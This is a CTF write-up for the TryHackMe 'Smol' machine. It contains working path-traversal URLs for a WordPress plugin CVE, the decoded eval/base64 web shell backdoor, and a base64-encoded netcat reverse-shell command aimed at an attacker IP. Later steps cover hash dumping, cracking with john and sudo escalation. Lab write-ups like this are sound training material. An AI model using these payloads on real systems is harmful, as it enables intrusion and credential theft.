@@ -1,0 +1,145 @@
+---
+layout: post
+title:  "Smol (THM)"
+date:   2025-08-01 23:48:43 -0400
+author: robo.uzi
+tags: [CTF, TryHackMe]
+---
+
+## Initial Compromise
+
+Prompt: At the heart of **Smol** is a WordPress website, a common target due to its extensive plugin ecosystem. The machine showcases a publicly known vulnerable plugin, highlighting the risks of neglecting software updates and security patches. Enhancing the learning experience, Smol introduces a backdoored plugin, emphasizing the significance of meticulous code inspection before integrating third-party components.
+
+I know to start with looking for wordpress plugins. 
+
+Start with nmap: `nmap -p- -T5 -vv 10.10.100.178 -oN smolfullnmap.txt`
+
+`nmap -sVC -p 22,80 -vv -T4 10.10.100.178 -oN smolnmap.txt`:
+```shell
+PORT   STATE SERVICE REASON  VERSION  
+22/tcp open  ssh     syn-ack OpenSSH 8.2p1 Ubuntu 4ubuntu0.9 (Ubuntu Linux; protocol 2.0)  
+80/tcp open  http    syn-ack Apache httpd 2.4.41 ((Ubuntu))  
+|_http-title: Did not follow redirect to http://www.smol.thm  
+| http-methods:    
+|_  Supported Methods: GET HEAD POST OPTIONS  
+|_http-server-header: Apache/2.4.41 (Ubuntu)  
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+```
+
+Add `www.smol.thm` and `smol.thm` to `/etc/hosts`.
+
+I run `wpscan` like this: `podman run -it docker.io/wpscanteam/wpscan --url http://www.smol.thm/`:
+```shell
+[+] WordPress version 6.7.1 identified (Outdated, released on 2024-11-21).  
+| Found By: Rss Generator (Passive Detection)  
+|  - http://www.smol.thm/index.php/feed/, <generator>https://wordpress.org/?v=6.7.1</generator>  
+|  - http://www.smol.thm/index.php/comments/feed/, <generator>https://wordpress.org/?v=6.7.1</generator>  
+  
+[+] WordPress theme in use: twentytwentythree  
+| Location: http://www.smol.thm/wp-content/themes/twentytwentythree/  
+| Last Updated: 2024-11-13T00:00:00.000Z  
+| Readme: http://www.smol.thm/wp-content/themes/twentytwentythree/readme.txt  
+| [!] The version is out of date, the latest version is 1.6  
+| [!] Directory listing is enabled  
+| Style URL: http://www.smol.thm/wp-content/themes/twentytwentythree/style.css  
+| Style Name: Twenty Twenty-Three  
+| Style URI: https://wordpress.org/themes/twentytwentythree  
+| Description: Twenty Twenty-Three is designed to take advantage of the new design tools introduced in WordPress 6....  
+| Author: the WordPress team  
+| Author URI: https://wordpress.org  
+|  
+| Found By: Urls In Homepage (Passive Detection)  
+|  
+| Version: 1.2 (80% confidence)  
+| Found By: Style (Passive Detection)  
+|  - http://www.smol.thm/wp-content/themes/twentytwentythree/style.css, Match: 'Version: 1.2'  
+  
+[+] Enumerating All Plugins (via Passive Methods)  
+[+] Checking Plugin Versions (via Passive and Aggressive Methods)  
+  
+[i] Plugin(s) Identified:  
+  
+[+] jsmol2wp  
+| Location: http://www.smol.thm/wp-content/plugins/jsmol2wp/  
+| Latest Version: 1.07 (up to date)  
+| Last Updated: 2018-03-09T10:28:00.000Z  
+|  
+| Found By: Urls In Homepage (Passive Detection)  
+|  
+| Version: 1.07 (100% confidence)  
+| Found By: Readme - Stable Tag (Aggressive Detection)  
+|  - http://www.smol.thm/wp-content/plugins/jsmol2wp/readme.txt  
+| Confirmed By: Readme - ChangeLog Section (Aggressive Detection)  
+|  - http://www.smol.thm/wp-content/plugins/jsmol2wp/readme.txt  
+```
+
+I find CVE-2018-20463 (https://github.com/Kalidas-7/CVE/blob/main/WordPress%20JSmol2WP) which enables arbritrary file read, and SSRF. In `/wp-content/plugins/jsmol2wp/php/jsmol.php` 137th line the parameter `$query` of `file_get_contents` is directly controllable, so `php://filter` is used to read it. You can also use `file:///etc/passwd` to read the absolute path.
+
+I visit `http://www.smol.thm/wp-content/plugins/jsmol2wp/php/jsmol.php?isform=true&call=getRawDataFromDatabase&query=php://filter/resource=../../../../wp-config.php` and am able to read the file. I find some useful information:
+```php
+/** Database username */
+define( 'DB_USER', 'redacted' );
+
+/** Database password */
+define( 'DB_PASSWORD', 'redacted' );
+```
+
+I visit `http://www.smol.thm/wp-content/plugins/jsmol2wp/php/jsmol.php?isform=true&call=getRawDataFromDatabase&query=file:///etc/passwd` and discover the users `xavi`, `diego`, `think`, and `gege`.
+
+I visit `http://www.smol.thm/wp-admin/` and login with the credentials I found.
+
+I find a hidden post `http://www.smol.thm/wp-admin/post.php?post=58&action=edit` it contained the hint `1- [IMPORTANT] Check Backdoors: Verify the SOURCE CODE of "Hello Dolly" plugin as the site's code revision.`
+
+I visit `http://www.smol.thm/wp-content/plugins/jsmol2wp/php/jsmol.php?isform=true&call=getRawDataFromDatabase&query=php://filter/resource=../../hello.php` to read the file. 
+
+In the file I find `eval(base64_decode('CiBpZiAoaXNzZXQoJF9HRVRbIlwxNDNcMTU1XHg2NCJdKSkgeyBzeXN0ZW0oJF9HRVRbIlwxNDNceDZkXDE0NCJdKTsgfSA='));` which decodes to `if (isset($_GET["\143\155\x64"])) { system($_GET["\143\x6d\144"]); }`.
+
+This decodes to:
+```php
+if (isset($_GET["cmd"])) {
+    system($_GET["cmd"]);
+}
+```
+
+I can set a cmd parameter and get code execution on a link somewhere. I visit `https://www.revshells.com/` and generate a busybox netcat reverse shell and base64 encode it. The payload will be: `?cmd=echo YnVzeWJveCBuYyAxMC4xMy42Ni4xMjMgMTMzNyAtZSBzaA== | base64 -d | bash`
+
+I test setting the parameter `?cmd=...` on `/wp-admin/edit.php`, `/wp-admin/media-new.php`, `/wp-admin/plugin-install.php`, and `/wp-admin/index.php`. After setting my listener `nc -lvnp 1337`, `http://www.smol.thm/wp-admin/index.php?cmd=echo YnVzeWJveCBuYyAxMC4xMy42Ni4xMjMgMTMzNyAtZSBzaA== | base64 -d | bash` gets me a shell as `www-data`. 
+
+___
+
+## Priv Esc
+
+I fix my shell with:
+```shell
+python3 -c 'import pty;pty.spawn("/bin/bash")'
+CTRL+Z
+stty raw -echo; fg
+export TERM=xterm
+```
+
+I login to the mysql database  `mysql -u wpuser -p` with the creds from earlier.
+
+Run `show databases;` then `use wordpress`. Then I run `show tables;`, then `select * from wp_users;`. I get 6 password hashes:
+```shell
+1 | admin | $P$hash | admin | admin@smol.thm
+2 | wpuser| $P$hash | wp    | wp@smol.thm
+3 | think | $P$hash | think | josemlwdf@smol.thm
+4 | gege  | $P$hash | gege  | gege@smol.thm
+5 | diego | $P$hash | diego | diego@local
+6 | xavi  | $P$hash | xavi  | xavi@smol.thm
+```
+These hashes belong to `phpass, WordPress (MD5), Joomla (MD5)`
+
+I copy the 6 hashes to a file for cracking. I am not using a GPU right now so I will use john the ripper: `/usr/sbin/john --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt`. I crack one password.
+
+Run `su diego` and become this user. Running `id` I can see I'm in the group `internal` which gives me some read permissions. This allows me to read `think`s ssh key.
+
+Copy the key, run `chmod 600 id_rsa` then `ssh -i id_rsa think@smol.thm`.
+
+The user `gege` has the file `wordpress.old.zip` in his home directory but `think` cannot access it. `su gege` works to become this user. I download `wordpress.old.zip` and crack its password with `/usr/sbin/zip2john wordpress.old.zip > zip.hash` then `/usr/sbin/john --wordlist=/usr/share/wordlists/rockyou.txt zip.hash`.
+
+I look in the `wp-config.php` for the old site and find credentials for `xavi`.
+
+I run `sudo -l` and discover `(ALL : ALL) ALL`. I run `sudo su` and become root.
+
+___
